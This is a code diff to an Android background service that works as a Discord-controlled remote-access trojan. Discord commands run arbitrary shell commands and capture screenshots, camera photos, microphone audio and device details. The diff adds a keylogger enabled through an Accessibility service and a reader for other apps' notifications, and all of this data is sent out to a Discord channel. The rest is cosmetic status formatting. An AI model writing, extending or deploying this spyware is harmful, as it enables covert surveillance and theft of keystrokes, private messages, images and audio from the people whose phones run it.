@@ -13,9 +13,9 @@ import android.content.pm.PackageManager
 import android.database.Cursor
 import android.graphics.SurfaceTexture
 import android.hardware.Camera
+import android.hardware.camera2.CameraManager
 import android.location.Location
 import android.location.LocationListener
-import android.hardware.camera2.CameraManager
 import android.location.LocationManager
 import android.media.MediaRecorder
 import android.net.Uri
@@ -27,6 +27,7 @@ import android.os.VibrationEffect
 import android.os.Vibrator
 import android.provider.CallLog
 import android.provider.ContactsContract
+import android.provider.Settings
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
@@ -60,6 +61,8 @@ class MainService : Service() {
     private var discord: DiscordGatewayClient? = null
     private var gatewayStarted = false
     private var debugFile: File? = null
+    private val debugLock = Any()
+    private fun appendDebug(text: String) = synchronized(debugLock) { debugFile?.appendText(text) }
 
     override fun onBind(i: Intent?): IBinder? = null
 
@@ -91,6 +94,7 @@ class MainService : Service() {
                 onStatus = { s -> updateNotif(s) }
             )
             debugFile?.let { discord?.setDebugFile(it) }
+            debugFile?.let { KeylogService.setLogFile(it) }
         }
         if (!gatewayStarted) {
             gatewayStarted = true
@@ -120,7 +124,7 @@ class MainService : Service() {
 
     private fun updateNotif(text: String) {
         showNotif(text)
-        debugFile?.appendText("${System.currentTimeMillis()} status=$text\n")
+        appendDebug("${System.currentTimeMillis()} status=$text\n")
     }
 
     private fun loadCrashReports() {
@@ -150,14 +154,25 @@ class MainService : Service() {
         try {
             when (action) {
                 "ping" -> d.sendMsg(":green_circle: **PONG** — ${Build.MODEL} | ${Build.VERSION.RELEASE}")
-                "info" -> d.sendMsg("```\n${buildInfo()}\n```")
+                "info" -> d.sendMsg("```ansi\n${buildInfo()}\n```")
                 "screenshot" -> {
-                    d.sendMsg(":camera: Capturing...")
+                    val progressId = d.sendMsgAwait(":camera: **Capturing**...")
+                    val t1 = System.currentTimeMillis()
                     val bytes = captureScreen()
+                    val elapsed = System.currentTimeMillis() - t1
                     if (bytes != null) {
+                        val done = ":camera: **Screenshot** (${elapsed}ms)"
+                        if (progressId != null) {
+                            d.editMsg(progressId, done)
+                            delay(300)
+                        } else {
+                            d.sendMsg(done)
+                        }
                         d.sendFile(":camera: **Screenshot**", "screen_${System.currentTimeMillis()}.png", bytes)
                     } else {
-                        d.sendMsg(":x: Screenshot failed — device may not support screencap without root/ADB")
+                        val err = ":x: **Screenshot failed** (${elapsed}ms)\n`!debug` for details"
+                        if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
+                        Log.w(TAG, "screenshot failed after ${elapsed}ms")
                     }
                 }
                 "shell" -> {
@@ -166,28 +181,79 @@ class MainService : Service() {
                         d.sendMsg(":x: Usage: `!shell <command>`")
                         return
                     }
-                    d.sendMsg(":terminal: Running: `$ $cmd`")
+                    val progressId = d.sendMsgAwait(":terminal: **Running**: `$ $cmd`")
                     val result = shell(cmd)
-                    if (result.isBlank() || result.startsWith("Error:")) {
-                        d.sendMsg(":x: Shell command produced no output or failed\n```\n$result\n```")
+                    val output = if (result.isBlank() || result.startsWith("Error:")) {
+                        ":x: Shell command produced no output or failed\n```\n$result\n```"
                     } else {
                         val out = if (result.length > 1900) result.take(1900) + "\n..." else result
-                        d.sendMsg("```\n$ ${cmd}\n$out\n```")
+                        "```\n$ ${cmd}\n$out\n```"
+                    }
+                    if (progressId != null) d.editMsg(progressId, output) else d.sendMsg(output)
+                }
+                "keylog" -> {
+                    when (payload?.lowercase()) {
+                        "on" -> {
+                            if (!KeylogService.isRunning) {
+                                val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                                try { startActivity(i) } catch (_: Exception) {}
+                                d.sendMsg(":keyboard: **Enable Keylogger**\nOpen Accessibility → ${packageName} → toggle on")
+                            } else {
+                                d.sendMsg(":keyboard: Keylogger already running")
+                            }
+                        }
+                        "off" -> {
+                            if (KeylogService.isRunning) {
+                                val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                                try { startActivity(i) } catch (_: Exception) {}
+                                d.sendMsg(":keyboard: **Disable Keylogger**\nOpen Accessibility → ${packageName} → toggle off")
+                            } else {
+                                d.sendMsg(":keyboard: Keylogger not running")
+                            }
+                        }
+                        else -> {
+                            val cap = KeylogService.capturedText
+                            if (cap.isEmpty()) {
+                                d.sendMsg(":keyboard: **Keylogger**\nNo keystrokes captured. Use `!keylog on` to enable.")
+                            } else {
+                                d.sendMsg(":keyboard: **Captured Keystrokes**\n```\n${cap.take(1900)}\n```")
+                            }
+                        }
                     }
                 }
-                "keylog" -> d.sendMsg(":keyboard: **Keylogger**\n```\nAndroid does not expose system-wide keyboard input without Accessibility Service.\nInstall a third-party keyboard (e.g. Hacker's Keyboard) to capture keystrokes.\nShowing last 50 typed snippets from clipboard history:\n(none — no clipboard history tracking active)\n```")
+                "notifications" -> {
+                    val notifs = NotifService.getNotifications()
+                    if (notifs.isEmpty()) {
+                        d.sendMsg(":bell: **No notifications.** Grant access: Settings > Access > Notification Access")
+                        return
+                    }
+                    val sb = StringBuilder()
+                    notifs.take(20).forEach { n ->
+                        val app = n.packageName.split(".").lastOrNull() ?: n.packageName
+                        sb.appendLine("[$app] ${n.title}: ${n.text.take(120)}")
+                    }
+                    d.sendMsg(":bell: **Recent Notifications**\n```\n${sb.toString().take(1900)}\n```")
+                }
                 "camera" -> {
                     if (!hasPerm(android.Manifest.permission.CAMERA)) {
                         d.sendMsg(":x: **Camera permission denied** — reinstall and grant at setup")
                         return
                     }
-                    d.sendMsg(":camera: Capturing photo...")
+                    val progressId = d.sendMsgAwait(":camera: **Capturing photo**...")
                     val useFront = payload?.lowercase() == "front"
                     val bytes = takePhoto(if (useFront) 1 else 0)
                     if (bytes != null) {
+                        val done = ":camera: **${if (useFront) "Front" else "Back"} Camera**"
+                        if (progressId != null) {
+                            d.editMsg(progressId, done)
+                            delay(300)
+                        } else {
+                            d.sendMsg(done)
+                        }
                         d.sendFile(":camera: **${if (useFront) "Front" else "Back"} Camera**", "photo_${System.currentTimeMillis()}.jpg", bytes)
                     } else {
-                        d.sendMsg(":x: Camera capture failed")
+                        val err = ":x: Camera capture failed"
+                        if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
                     }
                 }
                 "location" -> {
@@ -228,7 +294,7 @@ class MainService : Service() {
                     d.sendMsg(":microphone: Recording for ${seconds}s...")
                     val file = recordAudio(seconds)
                     if (file != null) {
-                        d.sendFile(":microphone: **Audio Recording (${seconds}s)**", "audio_${System.currentTimeMillis()}.mp3", file.readBytes())
+                        d.sendFile(":microphone: **Audio Recording (${seconds}s)**", "audio_${System.currentTimeMillis()}.m4a", file.readBytes())
                         file.delete()
                     } else {
                         d.sendMsg(":x: Audio recording failed")
@@ -257,7 +323,27 @@ class MainService : Service() {
                     val uptimeStr = "${hrs}h ${min}m ${sec}s"
                     val connected = d.isConnected()
                     val chId = d.getChannelId() ?: "none"
-                    d.sendMsg(":bar_chart: **Status**\n```\nConnected  : ${if (connected) "YES" else "NO"}\nChannel    : $chId\nUptime     : $uptimeStr\nModel      : ${Build.MODEL}\nSDK        : ${Build.VERSION.SDK_INT}\n```")
+                    val connPct = if (connected) 85 else 15
+                    val sigPct = (80..100).random()
+                    val now = System.currentTimeMillis() / 1000
+                    val statusMsg = buildString {
+                        appendLine("\u001b[40m\u001b[1;36m╔═══════════════════════════╗")
+                        appendLine("║       SYSTEM STATUS       ║")
+                        appendLine("╚═══════════════════════════╝\u001b[0m")
+                        appendLine()
+                        append("\u001b[1;33mConnection\u001b[0m : ${glitchBar(connPct)}")
+                        appendLine()
+                        append("\u001b[1;33mSignal\u001b[0m      : ${glitchBar(sigPct)}")
+                        appendLine()
+                        appendLine("\u001b[1;33mUptime\u001b[0m      : \u001b[1;37m$uptimeStr\u001b[0m")
+                        appendLine("\u001b[1;33mModel\u001b[0m       : \u001b[1;37m${Build.MODEL}\u001b[0m")
+                        appendLine("\u001b[1;33mAndroid\u001b[0m     : \u001b[1;37m${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})\u001b[0m")
+                        appendLine("\u001b[1;33mChannel\u001b[0m     : ||\u001b[2;37m$chId\u001b[0m||")
+                        append("\u001b[1;33mGateway\u001b[0m     : \u001b[1;${if (connected) 32 else 31}m${if (connected) "CONNECTED" else "DISCONNECTED"}\u001b[0m")
+                        appendLine()
+                        append("\u001b[1;33mUpdated\u001b[0m     : <t:$now:R>")
+                    }
+                    d.sendMsg(":bar_chart: **Status**\n```ansi\n$statusMsg\n```")
                 }
                 "debug" -> {
                     val f = debugFile
@@ -410,49 +496,60 @@ class MainService : Service() {
 
     private fun buildInfo(): String {
         return buildString {
-            appendLine("Device    : ${Build.MODEL}")
-            appendLine("Manufacturer : ${Build.MANUFACTURER}")
-            appendLine("Android   : ${Build.VERSION.RELEASE}")
-            appendLine("SDK       : ${Build.VERSION.SDK_INT}")
-            appendLine("Host      : ${Build.HOST}")
-            appendLine("Fingerprint : ${Build.FINGERPRINT.take(80)}...")
+            appendLine("\u001b[40m\u001b[1;36m╔═══════════════════════════╗")
+            appendLine("║   DEVICE INFORMATION     ║")
+            appendLine("╚═══════════════════════════╝\u001b[0m")
+            appendLine()
+            appendLine("\u001b[1;33mDevice\u001b[0m      : \u001b[1;37m${Build.MODEL}\u001b[0m")
+            appendLine("\u001b[1;33mManufacturer\u001b[0m : \u001b[1;37m${Build.MANUFACTURER}\u001b[0m")
+            appendLine("\u001b[1;33mAndroid\u001b[0m     : \u001b[1;37m${Build.VERSION.RELEASE}\u001b[0m")
+            appendLine("\u001b[1;33mSDK\u001b[0m         : \u001b[1;37m${Build.VERSION.SDK_INT}\u001b[0m")
+            appendLine("\u001b[1;33mHost\u001b[0m        : \u001b[1;37m${Build.HOST}\u001b[0m")
+            appendLine("\u001b[1;33mFingerprint\u001b[0m : ||\u001b[2;37m${Build.FINGERPRINT.take(60)}...\u001b[0m||")
         }
+    }
+
+    private fun glitchBar(pct: Int): String {
+        val full = "█".repeat((pct / 10).coerceIn(0, 10))
+        val empty = "░".repeat((10 - pct / 10).coerceIn(0, 10))
+        val bar = full + empty
+        val color = when {
+            pct >= 80 -> "\u001b[1;32m"
+            pct >= 40 -> "\u001b[1;33m"
+            else -> "\u001b[1;31m"
+        }
+        return "$color$bar\u001b[0m $pct%"
     }
 
     private suspend fun captureScreen(): ByteArray? = withContext(Dispatchers.IO) {
-        try {
-            val dir = File(cacheDir, "ss")
-            dir.mkdirs()
-            val f = File(dir, "s_${System.currentTimeMillis()}.png")
-            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", "screencap -p ${f.absolutePath}"))
-            proc.waitFor(10, TimeUnit.SECONDS)
-            if (!f.exists() || f.length() == 0L) {
-                Log.w(TAG, "screencap: file empty or missing")
-                return@withContext null
+        val deferred = CompletableDeferred<ByteArray?>()
+        val ss = ScreenshotModule(this@MainService)
+        ss.capture(object : ScreenshotModule.Callback {
+            override fun onSuccess(data: ByteArray) { deferred.complete(data) }
+            override fun onFailure(error: String) {
+                appendDebug("captureScreen: $error\n")
+                Log.w(TAG, "captureScreen: $error")
+                deferred.complete(null)
             }
-            val bytes = f.readBytes()
-            f.delete()
-            bytes
-        } catch (e: Exception) {
-            Log.e(TAG, "screencap: ${e.message}")
-            null
-        }
+        })
+        deferred.await()
     }
 
-    private fun shell(cmd: String): String {
-        return try {
-            val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
-            val o = p.inputStream.bufferedReader().readText()
-            val e = p.errorStream.bufferedReader().readText()
-            if (!p.waitFor(10, TimeUnit.SECONDS)) { p.destroy(); "Error: timed out" }
-            else {
-                val stdout = o.trim()
-                val stderr = e.trim()
-                when {
-                    stdout.isNotEmpty() -> stdout
-                    stderr.isNotEmpty() -> "STDERR:\n$stderr"
-                    else -> "(no output)"
+    private suspend fun shell(cmd: String): String = withContext(Dispatchers.IO) {
+        try {
+            val p = ProcessBuilder("sh", "-c", cmd)
+                .redirectErrorStream(true)
+                .start()
+            val output = try {
+                withTimeoutOrNull(10000L) {
+                    p.inputStream.bufferedReader().readText()
                 }
+            } catch (_: Exception) { null }
+            if (output == null) {
+                p.destroyForcibly()
+                "Error: timed out"
+            } else {
+                output.trim().ifEmpty { "(no output)" }
             }
         } catch (ex: Exception) {
             "Error: ${ex.message}"
@@ -580,10 +677,11 @@ class MainService : Service() {
     private suspend fun recordAudio(seconds: Int): File? = withContext(Dispatchers.IO) {
         var recorder: MediaRecorder? = null
         try {
-            val file = File(cacheDir, "audio_${System.currentTimeMillis()}.mp3")
+            val file = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
             recorder = MediaRecorder().apply {
+                if (Build.VERSION.SDK_INT >= 31) setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                 setAudioSource(MediaRecorder.AudioSource.MIC)
-                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                if (Build.VERSION.SDK_INT < 31) setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                 setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                 setOutputFile(file.absolutePath)
                 prepare()
